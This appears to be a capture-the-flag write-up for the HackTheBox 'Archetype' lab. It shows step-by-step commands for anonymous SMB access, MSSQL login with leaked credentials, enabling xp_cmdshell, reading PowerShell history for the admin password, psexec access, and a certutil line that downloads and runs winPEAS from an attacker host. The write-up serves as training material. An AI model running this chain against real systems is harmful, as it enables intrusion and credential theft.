## Info
| Property   | Value                     |
| ---------- | ------------------------- |
| Platform   | HackTheBox Starting Point |
| Difficulty | Very Easy                 |
| OS         | Windows                   |
| IP         | 10.129.12.66              |
| Date       | 2026-03-11                |
| Status     | ✅ Completed               |

---

## Key Concepts Learned
- SMB enumeration and anonymous access
- MSSQL exploitation with `xp_cmdshell`
- Impacket tools (`mssqlclient`, `psexec`)
- Finding credentials in configuration files
- PowerShell history file as credential source
- File transfer with `certutil`
- Automated enumeration with winPEAS

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV 10.129.12.66
```

**Open Ports:**

| Port | Service | Description |
|------|---------|-------------|
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows NetBIOS |
| 445 | microsoft-ds | SMB - Windows Server 2019 |
| 1433 | ms-sql-s | Microsoft SQL Server 2017 |
| 5985 | http | WinRM (Windows Remote Management) |

---

## Exploitation

### Step 1: SMB Enumeration

```bash
-- List shares without credentials (anonymous)
smbclient -L //10.129.12.66 -N

-- Connect to backups share
smbclient //10.129.12.66/backups -N

-- Download configuration file with credentials
get prod.dtsConfig
```

**Found credentials in prod.dtsConfig:**
- Username: `sql_svc`
- Password: `M3g4c0rp123`

### Step 2: Connect to MSSQL

Using impacket-mssqlclient to connect with found credentials:

```bash
impacket-mssqlclient 'ARCHETYPE/sql_svc:M3g4c0rp123@10.129.12.66' -windows-auth
```

### Step 3: Check Privileges

```sql
-- Check current database user
SELECT USER_NAME();
-- Result: dbo (database owner)

-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Result: 1 (we have sysadmin privileges)
```

**Note:** `dbo` = Database Owner - means we have high privileges and can enable `xp_cmdshell`.

### Step 4: Enable xp_cmdshell

```sql
-- Turn on xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Step 5: Find Administrator Credentials

```sql
-- Check PowerShell history for sensitive info
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```

**Output revealed administrator password:**
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

- Username: `administrator`
- Password: `MEGACORP_4dm1n!!`

### Step 6: Login as Administrator

**Option A: SMB Access**
```bash
smbclient //10.129.12.66/C$ -U administrator
# Password: MEGACORP_4dm1n!!
```

**Option B: Full Shell with psexec**
```bash
impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.129.12.66
```

---

## Alternative: Automated Enumeration with winPEAS

### File Transfer via certutil

First, start HTTP server on attacker machine:
```bash
cd /usr/share/peass/winpeas
python3 -m http.server 8080
```

Download winPEAS to target using `xp_cmdshell`:
```sql
EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>:8080/winPEASx64.exe C:\Users\Public\winPEAS.exe';
```

### Run winPEAS

```sql
-- Run directly (outputs to SQL console)
EXEC xp_cmdshell 'C:\Users\Public\winPEAS.exe';

-- Or save to file for easier review
EXEC xp_cmdshell 'C:\Users\Public\winPEAS.exe > C:\Users\Public\winpeas_output.txt';
```

### Key Sections to Check

| Color | Meaning |
|-------|---------|
| 🔴 Red | Critical findings - clear privesc paths |
| 🟡 Yellow | Interesting - worth investigating |

**Look for:**
- Stored credentials (AutoLogon, cached creds)
- Unquoted service paths
- Weak service permissions
- PowerShell history files
- Interesting files (config files, backups)

**Note:** On this box, winPEAS would find the same PowerShell history file containing administrator credentials.

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `C:\Users\sql_svc\Desktop\user.txt` | `xxxxxxxx` |
| Root | `C:\Users\Administrator\Desktop\root.txt` | `xxxxxxxx` |

---

## Attack Path Summary

```
SMB Anonymous Access → Found prod.dtsConfig
        ↓
Credentials: sql_svc:M3g4c0rp123
        ↓
MSSQL Login → dbo/sysadmin privileges
        ↓
Enable xp_cmdshell → Read PowerShell history
        ↓
Found: administrator:MEGACORP_4dm1n!!
        ↓
SMB/psexec as Administrator → Root flag
```

---

**Tags:** #mssql #windows #impacket #smb #starting-point #xp_cmdshell #winpeas #certutil
